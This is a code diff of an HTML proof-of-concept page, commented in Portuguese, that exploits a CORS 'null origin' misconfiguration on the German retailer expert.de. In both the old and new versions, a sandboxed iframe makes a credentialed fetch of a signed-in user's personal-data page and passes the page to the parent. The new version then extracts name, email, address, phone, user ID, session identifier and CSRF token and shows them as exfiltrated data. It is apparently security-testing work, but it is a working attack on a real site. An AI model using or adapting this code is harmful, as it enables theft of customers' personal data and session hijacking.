@@ -1,120 +1,131 @@
 <!DOCTYPE html>
 <html>
-<head><title>CORS PoC - expert.de</title></head>
+<head><title>CORS PoC - expert.de - trust_null</title></head>
 <body>
-<h2>CORS PoC — trust_null</h2>
-<p id="status">Iniciando...</p>
-<pre id="output" style="background:#f5f5f5;padding:15px;overflow:auto;max-height:500px;white-space:pre-wrap;word-break:break-all;font-size:11px"></pre>
+<h2>CORS Misconfiguration PoC — expert.de</h2>
+<p>Status: <b id="status">Aguardando...</b></p>
 
-<script>
-document.getElementById('status').textContent = 'Abrindo vetor...';
+<div id="dados" style="display:none;background:#fff3cd;border:2px solid #f00;padding:15px;margin:10px 0;border-radius:8px">
+  <h3 style="color:red">⚠ Dados Pessoais Exfiltrados:</h3>
+  <table id="tabela" style="border-collapse:collapse;width:100%;font-size:14px"></table>
+</div>
 
-// Vetor 1: iframe sandbox sem allow-same-origin
-// Gera Origin: null sem herdar contexto do pai
-var iframe = document.createElement('iframe');
-iframe.sandbox = 'allow-scripts';
-iframe.style.display = 'none';
-iframe.srcdoc = `
+<details>
+  <summary style="cursor:pointer;margin-top:10px">Ver resposta completa</summary>
+  <pre id="output" style="background:#f5f5f5;padding:15px;overflow:auto;max-height:400px;font-size:11px;white-space:pre-wrap;word-break:break-all"></pre>
+</details>
+
+<iframe sandbox="allow-scripts" style="display:none" srcdoc="
 <script>
-  var target = 'https://www.expert.de/shop/mein-expert/persoenliche-daten';
-  
-  fetch(target, {
-    method: 'GET',
-    credentials: 'include',
-    mode: 'cors'
-  })
-  .then(function(r) {
-    var status = r.status;
-    var acao = r.headers.get('access-control-allow-origin');
-    var acac = r.headers.get('access-control-allow-credentials');
-    return r.text().then(function(body) {
-      parent.postMessage({
-        type: 'result',
-        status: status,
-        acao: acao,
-        acac: acac,
-        bodyLength: body.length,
-        bodySnippet: body.substring(0, 500),
-        body: body
-      }, '*');
-    });
-  })
-  .catch(function(e) {
-    parent.postMessage({
-      type: 'error',
-      message: e.toString()
-    }, '*');
-  });
+fetch('https://www.expert.de/shop/mein-expert/persoenliche-daten', {
+  credentials: 'include'
+})
+.then(function(r){ return r.text(); })
+.then(function(html){ parent.postMessage(html, '*'); })
+.catch(function(e){ parent.postMessage('ERRO:' + e, '*'); });
 <\/script>
-`;
+"></iframe>
 
-document.body.appendChild(iframe);
-
+<script>
 window.addEventListener('message', function(e) {
-  var d = e.data;
-  
-  if (d.type === 'error') {
-    document.getElementById('status').innerHTML = 
-      '<span style="color:red">ERRO: ' + d.message + '</span>';
-    document.getElementById('output').textContent = d.message;
+  if (typeof e.data !== 'string') return;
+
+  if (e.data.startsWith('ERRO:')) {
+    document.getElementById('status').innerHTML =
+      '<span style="color:red">' + e.data + '</span>';
     return;
   }
-  
-  if (d.type === 'result') {
-    var sucesso = d.acao === 'null' && d.acac === 'true';
-    
-    document.getElementById('status').innerHTML = sucesso
-      ? '<span style="color:green">✔ VULNERÁVEL — ACAO: ' + d.acao + ' | Credentials: ' + d.acac + ' | HTTP ' + d.status + ' | ' + d.bodyLength + ' bytes recebidos</span>'
-      : '<span style="color:orange">ACAO: ' + d.acao + ' | HTTP ' + d.status + '</span>';
-    
-    // Tentar extrair dados pessoais do HTML
-    var parser = new DOMParser();
-    var doc = parser.parseFromString(d.body, 'text/html');
-    var extraidos = [];
-    
-    // Pegar inputs com valor
-    doc.querySelectorAll('input[value]').forEach(function(el) {
-      if (el.value && el.value.trim()) {
-        extraidos.push('INPUT [' + (el.name || el.id) + ']: ' + el.value);
-      }
-    });
-    
-    // Procurar padrões de dados no HTML bruto
-    var patterns = [
-      { name: 'Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g },
-      { name: 'Nome', regex: /"firstName"\s*:\s*"([^"]+)"/g },
-      { name: 'Sobrenome', regex: /"lastName"\s*:\s*"([^"]+)"/g },
-      { name: 'Rua', regex: /"street"\s*:\s*"([^"]+)"/g },
-      { name: 'CEP', regex: /"zip"\s*:\s*"([^"]+)"/g },
-      { name: 'Cidade', regex: /"city"\s*:\s*"([^"]+)"/g },
-      { name: 'Telefone', regex: /"telephone"\s*:\s*"([^"]+)"/g },
-      { name: 'UserId', regex: /"userId"\s*:\s*"([^"]+)"/g }
-    ];
-    
-    patterns.forEach(function(p) {
-      var matches = d.body.match(p.regex);
-      if (matches) {
-        extraidos.push(p.name + ': ' + matches.slice(0, 3).join(', '));
-      }
-    });
-    
-    var saida = '';
-    
-    if (extraidos.length > 0) {
-      saida += '=== DADOS PESSOAIS EXTRAÍDOS ===\n\n';
-      saida += extraidos.join('\n');
-      saida += '\n\n';
+
+  var html = e.data;
+  document.getElementById('output').textContent = html;
+
+  // Extrair o JSON do __NUXT_DATA__ que o Nuxt.js injeta
+  var match = html.match(/<script[^>]+id="__NUXT_DATA__"[^>]*>([\s\S]*?)<\/script>/);
+
+  if (!match) {
+    document.getElementById('status').innerHTML =
+      '<span style="color:orange">Resposta recebida (' + html.length +
+      ' bytes) mas usuário não está autenticado ou NUXT_DATA não encontrado.</span>';
+    return;
+  }
+
+  try {
+    var nuxtArray = JSON.parse(match[1]);
+
+    // Resolver referências do formato Nuxt (índices apontam para outros índices)
+    function resolve(arr, idx) {
+      var val = arr[idx];
+      if (typeof val === 'number' && val !== idx) return resolve(arr, val);
+      return val;
     }
-    
-    saida += '=== HEADERS DA RESPOSTA ===\n';
-    saida += 'Access-Control-Allow-Origin: ' + d.acao + '\n';
-    saida += 'Access-Control-Allow-Credentials: ' + d.acac + '\n';
-    saida += 'HTTP Status: ' + d.status + '\n';
-    saida += 'Tamanho da resposta: ' + d.bodyLength + ' bytes\n\n';
-    saida += '=== PRIMEIROS 500 CHARS DO BODY ===\n\n';
-    saida += d.bodySnippet;
-    
-    document.getElementById('output').textContent = saida;
+
+    // Procurar objeto com firstName, lastName, email, street, zip, city
+    var dados = {};
+    var campos = ['firstName','lastName','email','street','zip','city',
+                  'telephone','mobile','title','countryCode','houseNumber',
+                  'userId','id','sessionIdentifier','csrfToken'];
+
+    for (var i = 0; i < nuxtArray.length; i++) {
+      var item = nuxtArray[i];
+      if (item && typeof item === 'object' && !Array.isArray(item)) {
+        campos.forEach(function(campo) {
+          if (item[campo] !== undefined) {
+            var val = nuxtArray[item[campo]];
+            if (val && typeof val === 'string') {
+              dados[campo] = val;
+            }
+          }
+        });
+      }
+    }
+
+    // Montar tabela visual
+    var labels = {
+      firstName: 'Nome',
+      lastName: 'Sobrenome',
+      email: 'E-mail',
+      street: 'Rua',
+      houseNumber: 'Número',
+      zip: 'CEP',
+      city: 'Cidade',
+      countryCode: 'País',
+      telephone: 'Telefone',
+      mobile: 'Celular',
+      title: 'Tratamento',
+      userId: 'User ID',
+      id: 'Perfil ID',
+      sessionIdentifier: 'Session ID',
+      csrfToken: 'CSRF Token'
+    };
+
+    var tabela = document.getElementById('tabela');
+    var temDados = false;
+    var html_tabela = '<tr style="background:#dc3545;color:white"><th style="padding:8px;text-align:left">Campo</th><th style="padding:8px;text-align:left">Valor Exfiltrado</th></tr>';
+
+    Object.keys(labels).forEach(function(key) {
+      if (dados[key] && dados[key] !== 'null') {
+        html_tabela += '<tr style="border-bottom:1px solid #ddd"><td style="padding:8px;font-weight:bold">' +
+          labels[key] + '</td><td style="padding:8px;font-family:monospace">' +
+          dados[key] + '</td></tr>';
+        temDados = true;
+      }
+    });
+
+    tabela.innerHTML = html_tabela;
+
+    if (temDados) {
+      document.getElementById('dados').style.display = 'block';
+      document.getElementById('status').innerHTML =
+        '<span style="color:red;font-size:16px">✔ VULNERÁVEL — Dados pessoais exfiltrados via CORS trust_null!</span>';
+    } else {
+      document.getElementById('status').innerHTML =
+        '<span style="color:orange">Resposta recebida (' + html.length +
+        ' bytes) — NUXT_DATA encontrado mas sem dados de usuário (não autenticado?).</span>';
+    }
+
+  } catch(err) {
+    document.getElementById('status').innerHTML =
+      '<span style="color:orange">JSON parse erro: ' + err + '</span>';
   }
 });
 </script>
